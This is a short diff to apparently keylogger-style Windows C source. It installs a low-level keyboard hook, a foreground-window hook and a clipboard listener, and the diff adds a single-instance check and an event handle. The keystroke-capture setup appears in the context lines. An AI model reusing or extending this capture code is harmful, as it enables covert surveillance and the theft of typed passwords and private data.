@@ -3,7 +3,7 @@
 HHOOK winHook;
 BOOL foregroundWindowChanged;
 char foregroundWindowTitle[4096];
-
+HANDLE startEvent;
 /**
  * @function StartServiceCtrlDispatcher() :
  * Connecte le thread principal d’un processus de service au gestionnaire de contrôle de service,
@@ -13,6 +13,8 @@ int main(int argc, char **argv)
 {
     (void)argc;
     (void)argv;
+
+    CheckOneInstance();
     winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
     HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
     HWND hwnd;
@@ -44,4 +46,5 @@ int main(int argc, char **argv)
     UnhookWinEvent(winEvt);
     UnhookWindowsHookEx(winHook);
     RemoveClipboardFormatListener(hwnd);
+    CloseHandle(startEvent);
 }
